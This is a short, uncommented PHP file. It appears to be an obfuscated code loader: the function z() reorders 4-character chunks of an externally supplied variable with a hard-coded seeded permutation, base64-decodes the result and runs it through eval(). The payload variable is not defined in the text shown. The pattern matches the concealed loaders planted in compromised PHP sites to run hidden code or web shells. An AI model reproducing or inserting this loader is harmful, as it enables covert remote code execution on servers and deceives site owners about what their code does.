<?php

function z($src)
{
	$k = array();
	$v = array();
	$src = str_pad($src, intval(ceil(strlen($src) / 4)) * 4, " ");
	$v = str_split($src, 4);
	$s = abs(intval(1647731558)) % 9999999 + 1;
	$s = ($s * 125) % 2796203;
	while (sizeof($k) != sizeof($v))
	{
		for ($i = 1; $i <= sizeof($v); $i++)
		{
			$s = ($s * 125) % 2796203;
			$key = $s % (sizeof($v)) + 1;
			array_push($k, $key);
		}

		$k = array_unique($k);
	}

	$src = array();
	$r = "";
	$i = 0;
	foreach($k as $q)
	{
		$src[$q] = $v[$i++];
	}

	ksort($src);
	foreach($src as $c) $r.= $c;
	eval(base64_decode($r));
}

z($albiotl);
